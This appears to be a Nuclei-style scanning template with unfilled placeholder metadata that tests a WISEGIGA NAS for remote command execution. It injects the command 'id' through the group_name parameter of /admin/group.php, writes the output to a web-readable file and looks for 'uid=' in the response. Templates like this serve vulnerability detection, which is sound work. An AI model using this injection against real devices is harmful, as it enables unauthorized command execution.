id: WISEGIGA-nas-rce
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: description
  reference:
    - https://
  tags: tags
variables:
  filename: "{{rand_base(6)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/group.php?memberid=root&cmd=add&group_name=d;id>{{filename}}.txt"
      - "{{BaseURL}}/admin/{{filename}}.txt"

    matchers:
      - type: word
        part: body
        words:
          - 'uid='
